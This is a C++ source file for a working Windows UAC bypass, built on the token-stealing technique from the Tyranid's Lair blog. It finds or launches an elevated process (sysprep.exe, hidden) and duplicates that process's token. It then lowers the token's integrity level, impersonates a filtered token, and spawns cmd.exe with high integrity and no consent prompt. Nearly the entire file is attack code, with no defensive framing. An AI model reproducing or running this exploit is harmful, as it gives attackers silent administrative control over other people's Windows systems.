#include "stdafx.h"
#include "token_manipulation.hpp"
#include "ntdll.hpp"

/*
 * Thanks: CIA :)
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-1.html
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html
 * https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-3.html
 */

bool token_manipulation::run()
{
	// FIRST WE SEARCH FOR ANY RUNNING ELEVATED APP IN SAME SECTION
	safe_handle process_handle;
	auto created_process = false;
	if (!token_manipulation::find_elevated_process(process_handle)) // NO ELEVATED PROCESSES FOUND - LAUNCH AUTO-ELEVATING EXECUTABLE & TRIGGER ALWAYS_NOTIFY :'(
		created_process = token_manipulation::launch_auto_elevating_app(process_handle);

	// OPEN ELEVATED PROCESS' TOKEN
	safe_handle token_handle;
	if (!token_manipulation::open_process_token(process_handle, MAXIMUM_ALLOWED, token_handle))
	{
		std::cout << "[!] open_process_token failed" << std::endl;
		return false;
	}

	std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle.get_handle()) << std::dec << std::endl;

	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
	if (created_process)
		TerminateProcess(process_handle.get_handle(), 1);

	// DUPLICATE TOKEN WITH TOKEN_ALL_ACCESS
	safe_handle dup_token_handle;
	if (!token_manipulation::duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary, dup_token_handle))
	{
		std::cout << "[!] duplicate_token failed" << std::endl;
		return false;
	}
	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle.get_handle()) << std::dec << std::endl;

	// LOWER TOKEN IL FROM HIGH -> MEDIUM
	if (!token_manipulation::lower_token_il(dup_token_handle))
	{
		std::cout << "[!] lower_token_il failed" << std::endl;
		return false;
	}

	// CREATE RESTRICTED TOKEN
	safe_handle restricted_token_handle;
	if (!token_manipulation::create_restricted_token(dup_token_handle, restricted_token_handle))
	{
		std::cout << "[!] create_restricted_token failed" << std::endl;
		return false;
	}

	// IMPERSONATE USING RESTRICTED TOKEN
	if (!token_manipulation::impersonate_user(restricted_token_handle))
	{
		std::cout << "[!] impersonate_user failed" << std::endl;
		return false;
	}

	// LAUNCH PAYLOAD WITH HIGH IL, BYPASSING UAC
	if (!token_manipulation::launch_payload())
	{
		std::cout << "[!] launch_payload failed" << std::endl;
		return false;
	}

	// REVERT IMPERSONATION AS THIS TOKEN HAS RESTRICTIONS
	if (!token_manipulation::revert_impersonation())
	{
		std::cout << "[!] revert_impersonation failed" << std::endl;
		return false;
	}


	return true;
}

bool token_manipulation::find_elevated_process(safe_handle& process_handle)
{
	// ENUMERATE PROCESSES TO FIND AN ALREADY ELEVATED PROCESS
	// TO STEAL ITS TOKEN

	DWORD process_list[256], bytes_needed;
	if (EnumProcesses(process_list, sizeof(process_list), &bytes_needed))
	{
		auto amount = bytes_needed / sizeof(DWORD);
		for (size_t index = 0; index < amount; index++)
		{
			auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, process_list[index]);

			if (token_manipulation::is_process_admin(handle))
			{
				process_handle.set_handle(handle);
				return true;
			}

			CloseHandle(handle);
		}
	}

	return NULL;
}
bool token_manipulation::open_process_token(safe_handle & process_handle, ACCESS_MASK desired_access, safe_handle& token_handle)
{
	HANDLE temp_token_handle;
	auto status = ntdll::NtOpenProcessToken(process_handle.get_handle(), MAXIMUM_ALLOWED, &temp_token_handle);
	token_handle.set_handle(temp_token_handle);

	return NT_SUCCESS(status);
}
bool token_manipulation::duplicate_token(safe_handle& token_handle, ACCESS_MASK desired_access, _TOKEN_TYPE token_type, safe_handle& duplicated_token)
{
	SECURITY_QUALITY_OF_SERVICE sqos;
	OBJECT_ATTRIBUTES obja;
	HANDLE dup_token_handle;
	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = NULL;
	sqos.EffectiveOnly = false;
	InitializeObjectAttributes(&obja, NULL, NULL, NULL, NULL);
	obja.SecurityQualityOfService = &sqos;

	auto status = ntdll::NtDuplicateToken(token_handle.get_handle(), desired_access, &obja, false, token_type, &dup_token_handle);

	duplicated_token.set_handle(dup_token_handle);

	return NT_SUCCESS(status);
}
bool token_manipulation::create_restricted_token(safe_handle& token_handle, safe_handle& restricted_token)
{
	HANDLE restricted_token_handle;

	auto status = ntdll::NtFilterToken(token_handle.get_handle(), LUA_TOKEN, NULL, NULL, NULL, &restricted_token_handle);

	restricted_token.set_handle(restricted_token_handle);

	return NT_SUCCESS(status);
}

bool token_manipulation::is_process_admin(HANDLE process)
{
	HANDLE temp_token_handle;
	OpenProcessToken(process, TOKEN_READ, &temp_token_handle);

	auto token_handle = safe_handle(temp_token_handle);

	_TOKEN_ELEVATION_TYPE result;
	DWORD bytes_read;
	GetTokenInformation(token_handle.get_handle(), TokenElevationType, &result, sizeof(_TOKEN_ELEVATION_TYPE), &bytes_read);

	return result == TokenElevationTypeFull;
}
bool token_manipulation::lower_token_il(safe_handle& token_handle)
{
	SID_IDENTIFIER_AUTHORITY authority = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID integrity_sid = nullptr;
	auto status = ntdll::RtlAllocateAndInitializeSid(&authority,1, SECURITY_MANDATORY_MEDIUM_RID, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &integrity_sid);

	if (!NT_SUCCESS(status))
	{
		std::cout << "[!] RtlAllocateAndInitializeSid failed" << std::endl;
		return false;
	}

	TOKEN_MANDATORY_LABEL token_label;

	token_label.Label.Attributes = SE_GROUP_INTEGRITY;
	token_label.Label.Sid = integrity_sid;

	status = ntdll::NtSetInformationToken(token_handle.get_handle(), TokenIntegrityLevel, &token_label,
		static_cast<ULONG>((sizeof(TOKEN_MANDATORY_LABEL) + ntdll::RtlLengthSid(integrity_sid))));

	return NT_SUCCESS(status);
}
bool token_manipulation::launch_auto_elevating_app(safe_handle& process_handle)
{
	// RUN ELEVATED APP
	SHELLEXECUTEINFOW shinfo;
	shinfo.cbSize = sizeof(SHELLEXECUTEINFOW);
	shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	shinfo.nShow = SW_HIDE;
	shinfo.lpFile = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
	shinfo.lpVerb = L"open";

	if (!ShellExecuteExW(&shinfo))
	{
		std::cout << "[!] ShellExecuteEx failed" << std::endl;
		return false;
	}

	process_handle.set_handle(shinfo.hProcess);

	return true;
}
bool token_manipulation::impersonate_user(safe_handle& token_handle)
{
	safe_handle imp_token_handle;
	if (!token_manipulation::duplicate_token(token_handle, TOKEN_IMPERSONATE | TOKEN_QUERY, TokenImpersonation, imp_token_handle))
		return false;

	if (imp_token_handle.get_handle() == NULL)
		return false;

	auto status = ntdll::NtSetInformationThread(
		CurrentThread,
		static_cast<THREADINFOCLASS>(5), //ThreadImpersonationToken
		&imp_token_handle,
		sizeof(HANDLE));

	return NT_SUCCESS(status);
}
bool token_manipulation::revert_impersonation()
{
	// REVERT TO SELF
	auto imp_token_handle = NULL;
	auto status = ntdll::NtSetInformationThread(
		CurrentThread,
		static_cast<THREADINFOCLASS>(5), //ThreadImpersonationToken
		&imp_token_handle,
		sizeof(HANDLE));

	return NT_SUCCESS(status);
}
bool token_manipulation::launch_payload()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	si.cb = sizeof(si);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	auto result = CreateProcessWithLogonW(TEXT("."), TEXT("."), TEXT("."),
		LOGON_NETCREDENTIALS_ONLY,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL, 0, NULL, nullptr,
		&si, &pi);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return result;
}
